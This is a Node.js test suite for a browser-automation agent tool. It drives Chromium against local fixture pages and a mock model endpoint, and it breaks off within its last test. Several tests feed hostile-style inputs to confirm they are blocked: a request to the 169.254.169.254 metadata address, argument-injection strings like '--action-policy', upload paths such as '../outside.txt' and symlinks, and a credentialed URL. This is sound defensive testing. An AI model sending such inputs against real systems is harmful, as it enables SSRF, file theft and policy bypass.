import assert from "node:assert/strict";
import { execFile, spawn, spawnSync } from "node:child_process";
import { createServer } from "node:http";
import { mkdir, mkdtemp, readFile, realpath, rm, stat, symlink, writeFile } from "node:fs/promises";
import { homedir, tmpdir } from "node:os";
import { join } from "node:path";
import { createInterface } from "node:readline";
import { after, afterEach, before, describe, it } from "node:test";
import { promisify } from "node:util";
import { commandForTool, describeRef, executeTool, runAgent } from "../dist/agent.js";
import { runEngine, runEngineBatch } from "../dist/engine.js";
import { createProxy, resolveAllowed } from "../dist/proxy.js";
import { loadWorkflow, replayWorkflow, saveWorkflow } from "../dist/workflow.js";
import { startMcp } from "./mcp-client.mjs";

let server;
let origin;
let modelServer;
let modelRequests = 0;
let modelScript = null;
let modelBodies = [];
let canvasClicks = 0;
const toolCall = (name, args, id = name) => ({ id, type: "function", function: { name, arguments: typeof args === "string" ? args : JSON.stringify(args) } });
const modelConfig = () => ({ model: "mock", endpoint: `http://127.0.0.1:${modelServer.address().port}/v1/chat/completions`, timeoutMs: 10000 });
const exists = (path) => stat(path).then((entry) => entry.size > 0, () => false);
async function scratch() {
  const directory = await mkdtemp(join(tmpdir(), "agent-fast-test-"));
  temporaryDirectories.push(directory);
  return directory;
}
let tinyVideo;
const sessions = new Set();
const temporaryDirectories = [];
const execFileAsync = promisify(execFile);

function config(name, policy = "act", domains = ["127.0.0.1"]) {
  sessions.add(name);
  return {
    session: name,
    policy,
    allowedDomains: domains,
    executablePath: process.env.CHROME_PATH,
    headed: false,
    maxOutput: 20000,
    timeoutMs: 60000,
  };
}

function call(name, args = {}) {
  return { id: name, name, args };
}

before(async () => {
  tinyVideo = await readFile(new URL("./fixtures/tiny.webm", import.meta.url));
  const root = `<!doctype html><title>Agent-fast fixture</title><h1>Agent-fast fixture</h1><label for="q">Search</label><input id="q"><button id="go" onclick="event.preventDefault();document.querySelector('#output').textContent='Clicked: '+document.querySelector('#q').value">Go</button><a href="/next">More information</a><output id="output"></output>`;
  const next = `<!doctype html><title>Fixture next</title><h1>Next page</h1><p>Navigation succeeded</p>`;
  const dynamic = `<!doctype html><title>Dynamic fixture</title><button onclick="setTimeout(()=>{document.querySelector('#ready').hidden=false;document.querySelector('#ready').textContent='Ready'},100)">Load</button><div id="ready" hidden>Loading</div><iframe id="outer" src="/outer"></iframe>`;
  const outer = `<!doctype html><iframe id="inner" src="/inner"></iframe>`;
  const actions = `<!doctype html><title>Actions fixture</title><output id="out"></output>
    <div id="menu" role="button" tabindex="0" onmouseenter="out.textContent='hovered'">Menu</div>
    <button onclick="out.textContent='confirm:'+confirm('sure?')">Confirm</button>
    <button onclick="out.textContent='prompt:'+prompt('name?')">Prompt</button>
    <input type="checkbox" aria-label="Agree" onchange="out.textContent='agree:'+this.checked">
    <label for="amount">Amount</label><input id="amount" oninput="out.textContent='amount:'+this.value">
    <div id="src" role="button" tabindex="0" draggable="true" ondragstart="event.dataTransfer.setData('text','x')">Drag me</div>
    <div id="dst" role="button" tabindex="0" ondragover="event.preventDefault()" ondrop="out.textContent='dropped'" style="width:120px;height:60px;border:1px solid">Drop here</div>
    <input type="file" aria-label="Attachment" onchange="out.textContent='file:'+this.files[0].name">
    <a href="/file.txt" download>Download report</a>
    <button onclick="out.textContent='first'">Save</button><button onclick="out.textContent='second'">Save</button>
    <script>console.log('fixture-log');fetch('/api/data')</script>`;
  // Shaped like a maker portal: a custom combobox, a shadow-DOM component, a rich-text editor,
  // and a cross-origin designer frame that itself embeds a cross-origin canvas frame.
  const studio = (port) => `<!doctype html><title>Maker studio</title><body style="margin:0"><output id="out"></output>
    <div role="combobox" aria-label="Environment" aria-expanded="false" tabindex="0" id="env" onclick="list.hidden=!list.hidden;this.setAttribute('aria-expanded',String(!list.hidden))">Choose</div>
    <ul role="listbox" id="list" hidden><li role="option" tabindex="-1" onclick="env.textContent=this.textContent;list.hidden=true;out.textContent='env:'+this.textContent">Contoso (default)</li><li role="option" tabindex="-1">Fabrikam</li></ul>
    <maker-panel></maker-panel>
    <div role="textbox" aria-label="Formula" aria-multiline="true" contenteditable="true" oninput="out.textContent='formula:'+this.textContent" style="border:1px solid;min-height:20px"></div>
    <iframe id="designer" title="Designer" src="http://localhost:${port}/designer" width="500" height="300" style="border:0"></iframe>
    <script>customElements.define('maker-panel', class extends HTMLElement { connectedCallback() { const root = this.attachShadow({ mode: 'open' });
      root.innerHTML = '<button>New flow</button><label for="n">Flow name</label><input id="n">';
      root.querySelector('button').onclick = () => { document.querySelector('#out').textContent = 'new flow'; };
      root.querySelector('input').oninput = (event) => { document.querySelector('#out').textContent = 'name:' + event.target.value; }; } });</script>`;
  const designer = (port) => `<!doctype html><title>Designer</title><body style="margin:0"><button onclick="document.querySelector('#d').textContent='designer saved'">Save flow</button><output id="d"></output>
    <iframe title="Canvas" src="http://127.0.0.1:${port}/canvas" width="400" height="150" style="border:0;position:absolute;left:0;top:100px"></iframe>`;
  const canvas = `<!doctype html><title>Canvas</title><body style="margin:0"><button style="position:absolute;left:10px;top:10px;width:120px;height:40px" onclick="fetch('/canvas-clicked')">Add action</button>`;
  const video = `<!doctype html><title>Video fixture</title><video controls muted width="320" src="/tiny.webm"></video>`;
  const inner = `<!doctype html><button onclick="document.querySelector('#result').textContent='frame clicked'">Frame button</button><label for="search">Frame search</label><input id="search" onkeydown="if(event.key==='Enter')document.querySelector('#result').textContent=this.value"><select id="choice"><option value="a">Alpha</option><option value="b">Beta</option></select><output id="result"></output>`;
  server = createServer((request, response) => {
    if (request.url === "/tiny.webm") {
      response.setHeader("content-type", "video/webm");
      response.end(tinyVideo);
      return;
    }
    if (request.url === "/canvas-clicked") canvasClicks++;
    if (request.url === "/file.txt" || request.url === "/api/data" || request.url === "/canvas-clicked") {
      response.setHeader("content-type", "text/plain");
      response.end("file-body");
      return;
    }
    response.setHeader("content-type", "text/html; charset=utf-8");
    const cross = `<!doctype html><title>Cross-origin fixture</title><h1>Cross host</h1><iframe id="cross" title="Embedded app" src="http://localhost:${server.address().port}/inner"></iframe>`;
    response.end(({ "/next": next, "/dynamic": dynamic, "/outer": outer, "/inner": inner, "/cross": cross, "/actions": actions, "/video": video, "/studio": studio(server.address().port), "/designer": designer(server.address().port), "/canvas": canvas, "/long": `<!doctype html><title>Long</title><p>${"long page text ".repeat(2000)}</p>` })[request.url] ?? root);
  });
  await new Promise((resolve) => server.listen(0, "127.0.0.1", resolve));
  origin = `http://127.0.0.1:${server.address().port}`;

  modelServer = createServer((request, response) => {
    let body = "";
    request.on("data", (chunk) => body += chunk);
    request.on("end", () => {
      modelBodies.push(JSON.parse(body));
      modelRequests++;
      const valid = modelRequests > 1;
      response.setHeader("content-type", "application/json");
      if (modelScript) {
        const message = modelScript[Math.min(modelRequests, modelScript.length) - 1];
        response.end(JSON.stringify({ choices: [{ message: { role: "assistant", content: null, ...message } }] }));
        return;
      }
      response.end(JSON.stringify({
        choices: [{
          message: {
            role: "assistant",
            content: null,
            tool_calls: [{
              id: valid ? "valid" : "invalid",
              type: "function",
              function: {
                name: "done",
                arguments: JSON.stringify({
                  answer: valid ? "validated" : "invalid",
                  result: { title: valid ? "Agent-fast fixture" : 123 },
                }),
              },
            }],
          },
        }],
      }));
    });
  });
  await new Promise((resolve) => modelServer.listen(0, "127.0.0.1", resolve));
});

afterEach(async () => {
  modelScript = null;
  modelBodies = [];
  modelRequests = 0;
  for (const session of sessions) {
    await runEngine(config(session), ["close"]);
  }
  sessions.clear();
});

after(async () => {
  // The egress proxy holds keep-alive connections to the fixture server.
  server.closeAllConnections();
  modelServer.closeAllConnections();
  await Promise.all([
    new Promise((resolve) => server.close(resolve)),
    new Promise((resolve) => modelServer.close(resolve)),
  ]);
  await Promise.all(temporaryDirectories.map((directory) => rm(directory, { recursive: true, force: true })));
});

describe("real Chromium workflows", () => {
  it("executes native, batched, semantic, tab, and history actions", async () => {
    const current = config("browser-core");
    const opened = await executeTool(call("open", { url: origin }), current, true);
    assert.equal(opened.success, true, JSON.stringify(opened));
    const snapshot = await executeTool(call("snapshot"), current, true);
    assert.match(snapshot.data.snapshot, /textbox "Search".*ref=e2/);
    assert.equal((await executeTool(call("fill_label", { label: "Search", text: "native batch" }), current, true)).success, true);
    assert.equal((await executeTool(call("click_text", { text: "Go" }), current, true)).success, true);
    const results = await runEngineBatch(current, [["get", "text", "#output"], ["get", "title"]]);
    assert.equal(results[0].data.text, "Clicked: native batch");
    assert.equal(results[1].data.title, "Agent-fast fixture");
    assert.equal(results[1].data.lifecycle, undefined);
    assert.equal((await executeTool(call("click_text", { text: "More information" }), current, true)).success, true);
    const state = await executeTool(call("get_state"), current, true);
    assert.equal(state.data.title, "Fixture next");
    assert.equal((await executeTool(call("tab_new", { url: origin }), current, true)).success, true);
    assert.equal((await executeTool(call("tab_list"), current, true)).success, true);
    assert.equal((await executeTool(call("tab_switch", { target: "t1" }), current, true)).success, true);
    assert.equal((await executeTool(call("back"), current, true)).success, true);
  });

  it("enforces dangerous-action, read-only, domain, and argument boundaries", async () => {
    const current = config("browser-negative");
    assert.equal((await executeTool(call("open", { url: origin }), current, true)).success, true);
    for (const command of [["eval", "document.title"], ["state", "save", "example"], ["cookies"], ["network", "route", "*", "--abort"]]) {
      const result = await runEngine(current, command);
      assert.equal(result.success, false, command.join(" "));
      assert.match(String(result.error), /denied by policy/);
    }
    for (const [name, args] of [["upload", { target: "@e1", files: ["a.txt"] }], ["download", { target: "@e1" }]]) {
      const result = await executeTool(call(name, args), current, true);
      assert.equal(result.success, false);
      assert.match(String(result.error), /disabled/);
    }
    const readOnly = config("browser-negative-read", "read-only");
    assert.equal((await runEngine(readOnly, ["open", origin])).success, true);
    // The second command goes straight to the daemon, which enforces the policy itself.
    const readOnlyClick = await runEngine(readOnly, ["click", "#go"]);
    assert.equal(readOnlyClick.success, false);
    assert.match(String(readOnlyClick.error), /denied by policy/);

    // Asking for a narrower policy on a running session restarts it under that policy; it never inherits the wider one.
    const narrowed = { ...current, policy: "read-only" };
    assert.equal((await runEngine(narrowed, ["open", origin])).success, true);
    assert.match(String((await runEngine(narrowed, ["click", "#go"])).error), /denied by policy/);
    assert.match(String((await runEngine(narrowed, ["click", "#go"])).error), /denied by policy/);
    assert.equal((await executeTool(call("open", { url: origin }), current, true)).success, true);

    // A value that looks like an engine option is typed literally and changes nothing else.
    assert.equal((await executeTool(call("fill_label", { label: "Search", text: "--action-policy" }), current, true)).success, true);
    assert.equal((await executeTool(call("click_text", { text: "Go" }), current, true)).success, true);
    assert.equal((await executeTool(call("assert_text", { selector: "#output", text: "Clicked: --action-policy", timeout: 1000 }), current, true)).success, true);
    const cli = (args) => spawnSync(process.execPath, ["dist/cli.js", "--session", current.session, "--allowed-domains", "127.0.0.1", ...args], { encoding: "utf8" });
    assert.equal(cli(["fill", "#q", "--", "-5"]).status, 0);
    assert.equal(JSON.parse(cli(["get", "text", "#output"]).stdout).data.text, "Clicked: --action-policy");
    assert.equal((await runEngine(current, ["eval", "1"])).success, false);
    const extra = cli(["snapshot", "--", "--action-policy", "/tmp/unsafe"]);
    assert.notEqual(extra.status, 0);
    assert.match(extra.stderr, /accepts at most/);

    const privateNavigation = await executeTool(call("open", { url: origin }), config("browser-private", "act", []), true).catch((error) => error);
    assert.match(String(privateNavigation), /private\/loopback/);
    const outside = await executeTool(call("open", { url: "https://example.org/" }), config("browser-private", "act", ["example.com"]), true).catch((error) => error);
    assert.match(String(outside), /not in the allowed domains/);
    const privateCli = spawnSync(process.execPath, ["dist/cli.js", "open", origin], { encoding: "utf8" });
    assert.notEqual(privateCli.status, 0);
    assert.match(privateCli.stderr, /private\/loopback/);
  });

  it("blocks requests at the network layer after DNS resolution", async () => {
    // Hostname checks alone miss names that resolve to private addresses; the proxy checks the resolved address.
    await assert.rejects(resolveAllowed("localhost", []), /private or loopback/);
    await assert.rejects(resolveAllowed("64:ff9b::7f00:1", []), /private or loopback/);
    await assert.rejects(resolveAllowed("127.0.0.1", ["*.example.com"]), /not in the allowed domains/);
    assert.deepEqual(await resolveAllowed("127.0.0.1", ["127.0.0.1"]), ["127.0.0.1"]);

    const blocked = [];
    const proxy = createProxy(["127.0.0.1"], (host, reason) => blocked.push(`${host}: ${reason}`));
    await new Promise((resolve) => proxy.listen(0, "127.0.0.1", resolve));
    const through = (target) => new Promise((resolve, reject) => {
      const request = spawn(process.execPath, ["-e", `
        const http = require("node:http");
        http.get({ host: "127.0.0.1", port: ${proxy.address().port}, path: ${JSON.stringify(target)}, agent: false }, (r) => { r.resume(); console.log(r.statusCode); });
      `], { stdio: ["ignore", "pipe", "inherit"] });
      let output = "";
      request.stdout.on("data", (chunk) => output += chunk);
      request.on("exit", () => resolve(Number(output)));
      request.on("error", reject);
    });
    try {
      assert.equal(await through(`${origin}/next`), 200);
      assert.equal(await through(`http://localhost:${server.address().port}/next`), 403);
      assert.equal(await through("http://169.254.169.254/latest/meta-data"), 403);
      assert.deepEqual(blocked, ["localhost: not in the allowed domains", "169.254.169.254: not in the allowed domains"]);
    } finally {
      proxy.closeAllConnections();
      await new Promise((resolve) => proxy.close(resolve));
    }

    // In the browser: a page on an allowed host cannot load a frame from a host outside the allowlist.
    const current = config("browser-egress", "act", ["127.0.0.1"]);
    assert.equal((await executeTool(call("open", { url: `${origin}/cross` }), current, true)).success, true);
    const snapshot = await executeTool(call("snapshot", { full: true }), current, true);
    assert.doesNotMatch(snapshot.data.snapshot, /Frame search/);
    const { stdout } = await execFileAsync(process.execPath, ["dist/cli.js", "--session", current.session, "--allowed-domains", "127.0.0.1", "blocked"]);
    assert.ok(JSON.parse(stdout).data.blocked.some((entry) => entry.host === "localhost"));
  });

  it("replays workflows without storing filled secrets", async () => {
    const directory = await mkdtemp(join(tmpdir(), "agent-fast-flow-"));
    temporaryDirectories.push(directory);
    const path = join(directory, "workflow.json");
    await saveWorkflow(path, [
      { step: 0, action: "open", args: { url: origin }, result: {} },
      { step: 1, action: "fill_label", args: { label: "Search", text: "secret-value" }, result: {} },
      { step: 2, action: "click_text", args: { text: "Go" }, result: {} },
      { step: 3, action: "get_text", args: { selector: "#output" }, result: {} },
    ]);
    const serialized = await readFile(path, "utf8");
    assert.doesNotMatch(serialized, /secret-value/);
    assert.match(serialized, /\{\{value1\}\}/);
    const workflow = await loadWorkflow(path);
    const trace = await replayWorkflow(workflow, config("browser-replay"), { value1: "secret-value" }, executeTool, commandForTool);
    assert.match(JSON.stringify(trace), /Clicked: secret-value/);
    assert.deepEqual(trace.map((entry) => entry.step), [1, 2, 3, 4]);
    const longTrace = await replayWorkflow({ version: 1, steps: Array.from({ length: 51 }, () => ({ action: "get_text", args: { selector: "#output" } })) },
      config("browser-replay"), {}, executeTool, commandForTool);
    assert.equal(longTrace.length, 51);
    assert.equal(longTrace[50].step, 51);
    await assert.rejects(replayWorkflow(workflow, config("browser-private-replay", "act", []), { value1: "secret-value" }, executeTool, commandForTool), /private\/loopback/);

    const cliArgs = ["dist/cli.js", "--session", "browser-env-replay", "--allowed-domains", "127.0.0.1", "--act", "flow", path];
    sessions.add("browser-env-replay");
    const env = { ...process.env, value1: "env-secret-value" };
    const { stdout } = await execFileAsync(process.execPath, [...cliArgs, "--param-env", "value1"], { env });
    assert.match(JSON.stringify(JSON.parse(stdout)), /Clicked: env-secret-value/);
    for (const [extra, message, variables] of [
      [["--param-env", "value1", "--param", "value1=other"], /duplicate parameter/, env],
      [["--param-env", "value1"], /missing environment parameter/, { ...process.env, value1: undefined }],
      [["--param-env", "value1", "--param-env", "value1"], /duplicate parameter/, env],
      [["--param-env", "bad-name"], /environment variable/, env],
      [["--param-env", "value1", "--param-env", "unused"], /unused workflow parameter/, { ...env, unused: "unused" }],
    ]) {
      await assert.rejects(execFileAsync(process.execPath, [...cliArgs, ...extra], { env: variables }), (error) => {
        assert.match(error.stderr, message);
        assert.doesNotMatch(error.stderr, /env-secret-value/);
        return true;
      });
    }
  });

  it("rejects invalid structured output and accepts corrected output", async () => {
    modelRequests = 0;
    const endpoint = `http://127.0.0.1:${modelServer.address().port}/v1/chat/completions`;
    const result = await runAgent({
      task: `Open ${origin} and return its title`,
      act: false,
      maxSteps: 4,
      keepOpen: false,
      schema: {
        type: "object",
        properties: { title: { type: "string" } },
        required: ["title"],
        additionalProperties: false,
      },
    }, config("browser-schema", "read-only"), {
      model: "mock",
      endpoint,
      timeoutMs: 10000,
    });
    assert.equal(modelRequests, 2);
    assert.equal(result.status, "completed");
    assert.equal(result.result.title, "Agent-fast fixture");
    assert.equal(result.evidence.title, "Agent-fast fixture");
  });

  it("supports MCP initialize, navigate, read, and close", async () => {
    const child = spawn(process.execPath, ["dist/cli.js", "--session", "browser-mcp", "--allowed-domains", "127.0.0.1", "mcp"], {
      stdio: ["pipe", "pipe", "pipe"],
    });
    sessions.add("browser-mcp");
    const responses = new Map();
    createInterface({ input: child.stdout }).on("line", (line) => {
      if (!line.trim()) return;
      const message = JSON.parse(line);
      if (message.id) responses.set(message.id, message);
    });
    const send = (message) => child.stdin.write(JSON.stringify(message) + "\n");
    send({ jsonrpc: "2.0", id: 1, method: "initialize", params: { protocolVersion: "2025-06-18", capabilities: {}, clientInfo: { name: "agent-fast-test", version: "1" } } });
    send({ jsonrpc: "2.0", method: "notifications/initialized", params: {} });
    send({ jsonrpc: "2.0", id: 2, method: "tools/call", params: { name: "agent_fast_open", arguments: { url: origin } } });
    send({ jsonrpc: "2.0", id: 3, method: "tools/call", params: { name: "agent_fast_get_title", arguments: {} } });
    send({ jsonrpc: "2.0", id: 4, method: "tools/call", params: { name: "agent_fast_close", arguments: {} } });
    const deadline = Date.now() + 30000;
    while (![1, 2, 3, 4].every((id) => responses.has(id))) {
      assert.ok(Date.now() < deadline, "MCP timed out");
      await new Promise((resolve) => setTimeout(resolve, 25));
    }
    for (const id of [1, 2, 3, 4]) {
      assert.equal(responses.get(id).error, undefined);
      assert.notEqual(responses.get(id).result?.isError, true);
    }
    assert.equal(responses.get(3).result.content[0].text, "Agent-fast fixture");
    child.kill("SIGTERM");
  });

  it("handles delayed elements, nested frames, dropdowns, keyboard input, and assertions", async () => {
    const current = config("browser-compatibility");
    assert.equal((await executeTool(call("open", { url: `${origin}/dynamic` }), current, true)).success, true);
    assert.equal((await executeTool(call("click_text", { text: "Load" }), current, true)).success, true);
    assert.equal((await executeTool(call("wait_for", { selector: "#ready", timeout: 2000 }), current, true)).success, true);
    assert.equal((await executeTool(call("assert_text", { selector: "#ready", text: "Ready", timeout: 1000 }), current, true)).success, true);
    assert.equal((await executeTool(call("frame", { target: "#outer" }), current, true)).success, true);
    const frameSnapshot = await executeTool(call("snapshot"), current, true);
    const nestedFrame = frameSnapshot.data.snapshot.match(/iframe[^\n]*ref=(e[0-9]+)/i)?.[1];
    assert.ok(nestedFrame, JSON.stringify(frameSnapshot));
    const selected = await executeTool(call("frame", { target: `@${nestedFrame}` }), current, true);
    assert.equal(selected.success, true, JSON.stringify(selected));
    assert.equal((await executeTool(call("select", { selector: "#choice", value: "b" }), current, true)).success, true);
    const innerSnapshot = await executeTool(call("snapshot"), current, true);
    const searchRef = innerSnapshot.data.snapshot.match(/textbox "Frame search"[^\n]*ref=(e[0-9]+)/)?.[1];
    assert.ok(searchRef, JSON.stringify(innerSnapshot));
    assert.equal((await executeTool(call("fill", { target: searchRef, text: "nested frame passed" }), current, true)).success, true);
    assert.equal((await executeTool(call("press", { key: "Enter" }), current, true)).success, true);
    assert.equal((await executeTool(call("assert_text", { selector: "#result", text: "nested frame passed", timeout: 1000 }), current, true)).success, true);
    assert.equal((await executeTool(call("frame", { target: "main" }), current, true)).success, true);
    const mismatch = await executeTool(call("assert_text", { selector: "#ready", text: "wrong", timeout: 100 }), current, true);
    assert.equal(mismatch.success, false);
    assert.equal(mismatch.code, "assertion_failed");
    for (const command of [["wait-for", "#ready"], ["assert-text", "#ready", "Ready"]]) {
      const { stdout } = await execFileAsync(process.execPath, ["dist/cli.js", "--session", current.session,
        "--allowed-domains", "127.0.0.1", ...command]);
      assert.equal(JSON.parse(stdout).success, true);
    }
  });

  it("keeps MCP usable after failures and validates batches before acting", async () => {
    const session = "browser-mcp-reliable";
    sessions.add(session);
    const client = await startMcp(["--session", session, "--act", "--allowed-domains", "127.0.0.1"]);
    try {
      assert.equal((await client.tool("agent_fast_open", { url: origin })).result.isError, false);
      const overridden = await client.tool("agent_fast_open", { url: origin, session: "escape" });
      assert.equal(overridden.error.code, -32602);
      const invalid = await client.tool("agent_fast_batch", { steps: [
        { action: "click_text", args: { text: "Go" } },
        { action: "open", args: { url: "https://user:password@example.com" } },
      ] });
      assert.equal(invalid.result.isError, true);
      assert.equal((await client.tool("agent_fast_get_text", { selector: "#output" })).result.structuredContent.data.text, "");
      const timeout = await client.tool("agent_fast_wait_for", { selector: "#missing", timeout: 50 });
      assert.equal(timeout.result.isError, true);
      const missing = await client.tool("agent_fast_assert_text", { selector: "#missing", text: "Ready", timeout: 50 });
      assert.equal(missing.result.isError, true);
      assert.deepEqual((await client.request("ping")).result, {});
      assert.equal((await client.tool("agent_fast_get_title")).result.content[0].text, "Agent-fast fixture");
      const batched = await client.tool("agent_fast_batch", { steps: [
        { action: "fill_label", args: { label: "Search", text: "batched" } },
        { action: "click_text", args: { text: "Go" } },
        { action: "assert_text", args: { selector: "#output", text: "Clicked: batched", timeout: 500 } },
      ] });
      assert.equal(batched.result.isError, false, JSON.stringify(batched));
      assert.equal(batched.result.structuredContent.data.steps, 3);
      const failed = await client.tool("agent_fast_batch", { steps: [
        { action: "assert_text", args: { selector: "#output", text: "wrong", timeout: 50 } },
        { action: "click_text", args: { text: "More information" } },
      ] });
      assert.equal(failed.result.isError, true);
      assert.equal((await client.tool("agent_fast_get_url")).result.content[0].text, origin + "/");
      await client.tool("agent_fast_close");
      assert.equal((await client.tool("agent_fast_open", { url: `${origin}/next` })).result.isError, false);
      assert.equal((await client.tool("agent_fast_get_title")).result.content[0].text, "Fixture next");
    } finally { await client.close(); }
  });

  it("hovers, drags, handles dialogs, checks, types, and reads console, network, and screenshots", async () => {
    const directory = await scratch();
    const current = { ...config("browser-actions"), artifactsDir: join(directory, "artifacts"), uploadDir: join(directory, "up"), downloadDir: join(directory, "down") };
    const run = (name, args = {}) => executeTool(call(name, args), current, true);
    const expectOut = async (text) => {
      const result = await run("assert_text", { selector: "#out", text, timeout: 2000 });
      assert.equal(result.success, true, JSON.stringify(result));
    };
    assert.equal((await run("open", { url: `${origin}/actions` })).success, true);
    assert.equal((await run("hover", { role: "button", name: "Menu" })).success, true);
    await expectOut("hovered");

    assert.equal((await run("click", { role: "button", name: "Confirm" })).success, true);
    assert.equal((await run("dialog", { action: "status" })).data.type, "confirm");
    assert.equal((await run("dialog", { action: "accept" })).success, true);
    await expectOut("confirm:true");
    assert.equal((await run("click", { role: "button", name: "Prompt" })).success, true);
    assert.equal((await run("dialog", { action: "accept", text: "-Bob" })).success, true);
    await expectOut("prompt:-Bob");
    assert.equal((await run("click", { role: "button", name: "Confirm" })).success, true);
    assert.equal((await executeTool(call("dialog", { action: "dismiss" }), current, false)).success, true);
    await expectOut("confirm:false");

    assert.equal((await run("check", { role: "checkbox", name: "Agree" })).success, true);
    await expectOut("agree:true");
    assert.equal((await run("check", { role: "checkbox", name: "Agree", checked: false })).success, true);
    await expectOut("agree:false");

    assert.equal((await run("fill", { role: "textbox", name: "Amount", text: "-5" })).success, true);
    await expectOut("amount:-5");
    assert.equal((await run("type", { role: "textbox", name: "Amount", text: "0" })).success, true);
    assert.equal((await run("type", { text: "1" })).success, true);
    await expectOut("amount:-501");
    assert.equal((await run("fill", { role: "textbox", name: "Amount", text: "" })).success, true);
    await expectOut("amount:");

    const snapshot = (await run("snapshot")).data;
    const ref = (name) => `@${Object.entries(snapshot.refs).find(([, entry]) => entry.name === name)[0]}`;
    assert.equal((await run("drag", { source: ref("Drag me"), target: ref("Drop here") })).success, true);
    await expectOut("dropped");

    const ambiguous = await run("click", { role: "button", name: "Save" }).catch((error) => error);
    assert.match(String(ambiguous), /2 elements match/);
    assert.equal((await run("click", { role: "button", name: "Save", nth: 1 })).success, true);
    await expectOut("second");

    const logs = await run("console");
    assert.ok(logs.data.messages.some((message) => message.text === "fixture-log"), JSON.stringify(logs));
    assert.ok(Array.isArray(logs.data.errors));
    const requests = await run("network", { filter: "api" });
    assert.match(JSON.stringify(requests.data), /\/api\/data/);

    const shot = await run("screenshot", { full_page: true });
    assert.ok(shot.data.path.startsWith(current.artifactsDir));
    assert.equal((await readFile(shot.data.path)).subarray(1, 4).toString(), "PNG");

    await mkdir(current.uploadDir);
    await writeFile(join(current.uploadDir, "note.txt"), "hello");
    const outside = join(directory, "outside.txt");
    await writeFile(outside, "secret");
    // Creating a symbolic link needs a privilege on Windows; the other cases still run there.
    const linked = await symlink(outside, join(current.uploadDir, "link.txt")).then(() => true, () => false);
    const input = ref("Attachment");
    for (const files of [["../outside.txt"], ...(linked ? [["link.txt"]] : []), [outside], ["missing.txt"]]) {
      const refused = await run("upload", { target: input, files });
      assert.equal(refused.success, false, files[0]);
      assert.match(refused.error, /not a file inside the upload directory/);
    }
    assert.equal((await run("upload", { target: input, files: ["note.txt"] })).success, true);
    await expectOut("file:note.txt");

    const downloaded = await run("download", { target: ref("Download report") });
    assert.equal(downloaded.success, true, JSON.stringify(downloaded));
    assert.ok(downloaded.data.path.startsWith(await realpath(current.downloadDir)));
    assert.equal(await readFile(downloaded.data.path, "utf8"), "file-body");
  });

  it("drives a maker-portal-shaped app: custom combobox, shadow DOM, rich editor, and nested cross-origin frames", async () => {
    const current = config("browser-studio", "act", ["127.0.0.1", "localhost"]);
    const run = (name, args = {}) => executeTool(call(name, args), current, true);
    const expectOut = async (text) => {
      const result = await run("assert_text", { selector: "#out", text, timeout: 2000 });
      assert.equal(result.success, true, JSON.stringify(result));
    };
    assert.equal((await run("open", { url: `${origin}/studio` })).success, true);
    assert.equal((await run("wait_for", { load: "networkidle" })).success, true);

    // A combobox built from divs, as Fluent UI does, is not a native select.
    assert.equal((await run("click", { role: "combobox", name: "Environment" })).success, true);
    assert.equal((await run("click", { role: "option", name: "Contoso (default)" })).success, true);
    await expectOut("env:Contoso (default)");
    // Controls inside an open shadow root.
    assert.equal((await run("click", { role: "button", name: "New flow" })).success, true);
    await expectOut("new flow");
    assert.equal((await run("fill", { role: "textbox", name: "Flow name", text: "Weekly report" })).success, true);
    await expectOut("name:Weekly report");
    // A contenteditable editor takes real keystrokes.
    assert.equal((await run("click", { role: "textbox", name: "Formula" })).success, true);
    assert.equal((await run("type", { text: "Sum(1,2)" })).success, true);
    await expectOut("formula:Sum(1,2)");
    // First-level cross-origin frame: located from the main document.
    assert.equal((await run("click", { role: "button", name: "Save flow" })).success, true);

    // A cross-origin frame nested in a cross-origin frame has no refs in the engine; coordinates still reach it.
    const nested = await run("click", { role: "button", name: "Add action" }).catch((error) => error);
    assert.match(String(nested), /no button named "Add action"/);
    const box = (await runEngine(current, ["get", "box", "#designer"])).data;
    assert.equal(canvasClicks, 0);
    assert.equal((await run("click_at", { x: Math.round(box.x) + 70, y: Math.round(box.y) + 130 })).success, true);
    const deadline = Date.now() + 3000;
    while (canvasClicks === 0 && Date.now() < deadline) await new Promise((resolve) => setTimeout(resolve, 25));
    assert.equal(canvasClicks, 1);

    // To read or locate inside it, find the frame's address in the network log and open it in its own tab.
    const requests = JSON.stringify((await run("network", { filter: "/canvas" })).data);
    const address = requests.match(/http:\/\/127\.0\.0\.1:[0-9]+\/canvas(?=")/)?.[0];
    assert.equal(address, `${origin}/canvas`, requests.slice(0, 400));
    assert.equal((await run("tab_new", { url: address })).success, true);
    assert.equal((await run("click", { role: "button", name: "Add action" })).success, true);
    const second = Date.now() + 3000;
    while (canvasClicks === 1 && Date.now() < second) await new Promise((resolve) => setTimeout(resolve, 25));
    assert.equal(canvasClicks, 2);
  });

  it("plays video and reports playback through the accessibility tree", async () => {
    const current = config("browser-video");
    assert.equal((await executeTool(call("open", { url: `${origin}/video` }), current, true)).success, true);
    assert.equal((await executeTool(call("click", { role: "button", name: "play" }), current, true)).success, true);
    assert.equal((await executeTool(call("wait", { ms: 1200 }), current, true)).success, true);
    const playing = (await executeTool(call("snapshot"), current, true)).data.snapshot;
    assert.match(playing, /button "pause"/);
    assert.ok(Number(playing.match(/slider "video time scrubber"[^\n]*: ([0-9.]+)/)?.[1]) > 0.3, playing);
  });

  it("saves workflows that skip failed steps and survive ref renumbering, and captures failures", async () => {
    assert.deepEqual(describeRef({
      refs: { e4: { role: "button", name: "Save" }, e9: { role: "button", name: "Save" }, e2: { role: "link", name: "Home" } },
      snapshot: '- link "Home" [ref=e2]\n- button "Save" [ref=e4]\n- button "Save" [ref=e9]',
    }, "@e9"), { role: "button", name: "Save", nth: 1 });
    const directory = await scratch();
    const path = join(directory, "flow.json");
    await saveWorkflow(path, [
      { step: 0, action: "open", args: { url: `${origin}/actions` }, result: { success: true } },
      { step: 1, action: "click", args: { target: "@e99" }, result: { success: false, error: "stale ref" } },
      { step: 2, action: "click", args: { target: "@e99", role: "button", name: "Save", nth: 1 }, result: { success: true } },
      { step: 3, action: "fill", args: { target: "@e98", role: "textbox", name: "Amount", text: "[redacted]" }, result: { success: true } },
    ]);
    const workflow = await loadWorkflow(path);
    assert.deepEqual(workflow.steps, [
      { action: "open", args: { url: `${origin}/actions` } },
      { action: "click", args: { role: "button", name: "Save", nth: 1 } },
      { action: "fill", args: { role: "textbox", name: "Amount", text: "{{value1}}" } },
    ]);
    const current = { ...config("browser-robust-replay"), artifactsDir: join(directory, "artifacts") };
    await replayWorkflow(workflow, current, { value1: "42" }, executeTool, commandForTool);
    assert.equal((await executeTool(call("assert_text", { selector: "#out", text: "amount:42", timeout: 1000 }), current, true)).success, true);

